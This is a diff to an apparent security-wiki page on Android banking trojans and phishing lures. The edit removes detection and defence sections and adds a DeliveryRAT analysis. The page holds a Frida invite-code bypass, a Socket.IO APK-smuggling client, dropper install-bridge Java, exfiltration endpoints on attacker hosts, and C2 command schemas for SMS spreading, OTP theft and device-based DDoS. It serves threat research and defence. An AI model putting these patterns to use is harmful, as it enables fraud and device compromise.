@@ -54,14 +54,11 @@
 * **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` to detect unsolid POST bursts after code entry.
 * **mobileconfig Inspection** – Use `security cms -D -i profile.mobileconfig` on macOS to list `PayloadContent` and spot excessive entitlements.
 
-## Blue-Team Detection Ideas
-
-* **Certificate Transparency / DNS Analytics** to catch sudden bursts of keyword-rich domains.
-* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` from Dalvik clients outside Google Play.
-* **Invite-code Telemetry** – POST of 6–8 digit numeric codes shortly after APK install may indicate staging.
-* **MobileConfig Signing** – Block unsigned configuration profiles via MDM policy.
 
 ## Useful Frida Snippet: Auto-Bypass Invitation Code
+
+<details>
+<summary>Frida: auto-bypass invitation code</summary>
 
 ```python
 # frida -U -f com.badapp.android -l bypass.js --no-pause
@@ -82,13 +79,17 @@ Java.perform(function() {
 });
 ```
 
+</details>
+
+
 ## Indicators (Generic)
 
-```
+```text
 /req/checkCode.php        # invite code validation
 /upload.php               # batched ZIP exfiltration
 LubanCompress 1.1.8       # "Luban" string inside classes.dex
 ```
+
 
 ---
 
@@ -119,13 +120,14 @@ zipgrep -i "classes|.apk" sample.apk | head
 
 Example (sanitised):
 
-```
+```text
 GET https://rebrand.ly/dclinkto2
 Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
 Transform: "gate.html" → "gate.htm" (loaded in WebView)
 UPI credential POST: https://sqcepo.replit.app/addup.php
 SMS upload:           https://sqcepo.replit.app/addsm.php
 ```
+
 
 Pseudo-code:
 
@@ -206,27 +208,15 @@ public void onMessageReceived(RemoteMessage msg){
 }
 ```
 
-### Hunting patterns and IOCs
-- APK contains secondary payload at `assets/app.apk`
-- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
-- SMS exfiltration to `/addsm.php`
-- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
-- Apps labelled as generic “Update/Secure Update”
-- FCM `data` messages with a `_type` discriminator in untrusted apps
-
-### Detection & defence ideas
-- Flag apps that instruct users to disable network during install and then side-load a second APK from `assets/`.
-- Alert on the permission tuple: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
-- Egress monitoring for `POST /addup.php|/addsm.php` on non-corporate hosts; block known infrastructure.
-- Mobile EDR rules: untrusted app registering for FCM and branching on a `_type` field.
-
----
 
 ## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages
 
 Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.
 
 Typical client flow observed in the wild:
+
+<details>
+<summary>Socket.IO smuggling client example</summary>
 
 ```javascript
 // Open Socket.IO channel and request payload
@@ -248,15 +238,13 @@ socket.on("downloadComplete", () => {
 });
 ```
 
+</details>
+
+
 Why it evades simple controls:
 - No static APK URL is exposed; payload is reconstructed in memory from WebSocket frames.
 - URL/MIME/extension filters that block direct .apk responses may miss binary data tunneled via WebSockets/Socket.IO.
 - Crawlers and URL sandboxes that don’t execute WebSockets won’t retrieve the payload.
-
-Hunting and detection ideas:
-- Web/network telemetry: flag WebSocket sessions that transfer large binary chunks followed by creation of a Blob with MIME application/vnd.android.package-archive and a programmatic `<a download>` click. Look for client strings like socket.emit('startDownload'), and events named chunk, downloadProgress, downloadComplete in page scripts.
-- Play-store spoof heuristics: on non-Google domains serving Play-like pages, hunt for Google Play UI strings such as http.html:"VfPpkd-jY41G-V67aGc", mixed-language templates, and fake “verification/progress” flows driven by WS events.
-- Controls: block APK delivery from non-Google origins; enforce MIME/extension policies that include WebSocket traffic; preserve browser safe-download prompts.
 
 See also WebSocket tradecraft and tooling:
 
@@ -273,6 +261,9 @@ The RatOn banker/RAT campaign (ThreatFabric) is a concrete example of how modern
 Attackers present a WebView pointing to an attacker page and inject a JavaScript interface that exposes a native installer. A tap on an HTML button calls into native code that installs a second-stage APK bundled in the dropper’s assets and then launches it directly.
 
 Minimal pattern:
+
+<details>
+<summary>Dropper WebView install bridge (Java)</summary>
 
 ```java
 public class DropperActivity extends Activity {
@@ -302,6 +293,9 @@ public class DropperActivity extends Activity {
   }
 }
 ```
+
+</details>
+
 
 HTML on the page:
 
@@ -421,13 +415,107 @@ Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new
 - Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
 - NFC: `nfs`, `nfs_inject`
 
-### Detection & defence ideas (RatOn-style)
-- Hunt for WebViews with `addJavascriptInterface()` exposing installer/permission methods; pages ending in “/access” that trigger Accessibility prompts.
-- Alert on apps that generate high-rate Accessibility gestures/clicks shortly after being granted service access; telemetry that resembles Accessibility node dumps sent to C2.
-- Monitor Device Admin policy changes in untrusted apps: `lockNow`, password expiration, keyguard feature toggles.
-- Alert on MediaProjection prompts from non-corporate apps followed by periodic frame uploads.
-- Detect installation/launch of an external NFC-relay app triggered by another app.
-- For banking: enforce out-of-band confirmations, biometrics-binding, and transaction-limits resistant to on-device automation.
+
+## DeliveryRAT – server‑driven phishing + OTP/notification interception + USSD + device‑sourced HTTP DDoS (Android)
+
+Threat pattern distilled from 2025 DeliveryRAT builds: a loader‑>payload sideload, aggressive runtime permissioning, a WebSocket/REST C2, server‑driven phishing Activities, SMS/contact abuse, USSD dialing, and an on‑device HTTP flooder.
+
+### Distribution and loader
+- Small loader APK (e.g., `com.harry.loader`) embeds the RAT under `res/raw/` and shows a fake “Update” page.
+- Tapping Update requests Install‑unknown‑apps permission, installs the embedded APK, and then launches it by package (payload family typically `com.delviskesyty.*`).
+- Hides the obvious “download APK” flow and reduces friction; future runs start the payload by package name.
+
+### First‑run flow and permissions
+- Prompts for Notification Listener and to ignore battery optimizations; starts a long‑lived `WebSocketService` and displays a server‑driven UI beginning with a “tracking number” input.
+- Requests telephony/SMS perms depending on mode: `READ_SMS`, `RECEIVE_SMS`, `SEND_SMS`, `READ_PHONE_STATE`, `CALL_PHONE`; polls for `READ_PHONE_NUMBERS` and default‑SMS‑app status every ~5s.
+- SIM/line metadata is posted to `/send-number`; the entered tracking number plus SIM info is posted to `/track-nomer` to drive next steps.
+- Operating modes via config: `MODE="standart"` (full perms) vs `MODE="mini"` (low‑friction, primarily asks to become the default SMS handler to retain OTP interception).
+
+### Server‑driven phishing Activities (operator UI)
+The C2 selects one of five Activities, providing texts/assets and the exfil endpoint:
+- Card → collects cardholder/payment fields; POST `/send-card`.
+- Custom → up to three arbitrary text inputs; POST `/send-custom`.
+- Photo → requests `READ_MEDIA_IMAGES`/`READ_EXTERNAL_STORAGE`, lets user pick an image; POST `/send-photo`.
+- Qr → shows a server‑provided QR bitmap and text; continues flow.
+- Text → arbitrary text with confirm.
+Lifecycle callbacks POST to `/open-app`, `/swap-app`, `/close-app` so operators can track progress.
+
+### Persistence and data‑capture components
+- `NotificationListenerService`: forwards notification metadata/content to `/send-notification` and attempts to hide original notifications (conceals OTPs).
+- `SmsReceiver`: ingests inbound SMS; rebroadcasts `ACTION_NEW_SMS` to `WebSocketService` for near‑real‑time exfil.
+- `BootReceiver`: autostarts `WebSocketService` after boot.
+- Service hardening: 1‑minute `AlarmManager` + ~15‑minute watchdog; foreground notification (benign‑looking) such as “Data Sync”; network change receiver for auto‑reconnect.
+
+### C2 over WebSocket + REST
+- Device derives a HWID from `Settings.Secure.ANDROID_ID`; maintains a persistent WS channel and periodic HTTP POSTs to REST paths.
+- SMS exfiltration payload includes device/SIM metadata, team/worker IDs and the victim “track number”.
+
+<details>
+<summary>Example SMS exfil JSON (WebSocket)</summary>
+
+```json
+{
+  "Data": {
+    "message": "{sms_body}",
+    "sender": "{sender_phone}",
+    "messageId": "{sms_timestamp}",
+    "dateString": "{formatted_date}",
+    "hwid": "{android_id}",
+    "service": "{app_name}",
+    "teamId": "{team_id}",
+    "workerId": "{worker_id}",
+    "trackNumber": "{track_number}",
+    "deviceModel": "{Build.MODEL}",
+    "androidVersion": "{Build.VERSION.RELEASE}",
+    "type": "Новое смс",
+    "serviceCenter": "{sms_smsc}",
+    "operator": "{sim_operator}",
+    "phoneNumber": "{device_phone}"
+  }
+}
+```
+
+</details>
+
+- REST endpoints commonly observed (relative to the operator domain): `/send-number`, `/track-nomer`, `/send-card`, `/send-custom`, `/send-photo`, `/send-notification`, `/send-ussd`, `/send-answer`.
+
+### Remote command schema and behaviours
+Generic command envelope (WS → device):
+
+```json
+{
+  "type": "{command}",
+  "number": "{number}",
+  "text": "{text}",
+  "useAlternativeIcon": "{bool}",
+  "target": "{ddos_url}",
+  "total": "{ddos_total_requests}",
+  "concurrency": "{parallel_requests}",
+  "photo": "{base64_qr_bitmap}"
+}
+```
+
+Observed commands:
+- `allSmsContact` (`text`): mass‑send arbitrary SMS to every unique contact (worm‑like spread).
+- `call` / `callTwo` (`number`): dial arbitrary USSD; responses POSTed to `/send-ussd`.
+- `card`, `custom`, `photo`, `qr`: launch the phishing Activities described above.
+- `changeIcon` (`useAlternativeIcon`) and `hide`: stealth controls (alt icon, hide launcher entry).
+- `oldsms`: dump existing SMS to a text file and exfil via `/send-answer`.
+- DDoS: set `target` + `total` + `concurrency` to trigger a parallel HTTP flood from the handset.
+
+### Static config traits (typical keys)
+
+```json
+{
+  "API": "<c2_domain>",
+  "APPLICATION_ID": "com.delviskesyty.{...}",
+  "MODE": "standart|mini",
+  "TEAM_ID": "{id}",
+  "WORKER_ID": "{id}",
+  "VERSION_NAME": "2.x"
+}
+```
+
 
 ## References
 
@@ -440,5 +528,6 @@ Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new
 - [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
 - [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
 - [Socket.IO](https://socket.io)
+- [Delivery details: analysis of the new DeliveryRAT Android trojan version (F6)](https://www.f6.ru/blog/android-deliveryrat-research/)
 
 {{#include ../../banners/hacktricks-training.md}}
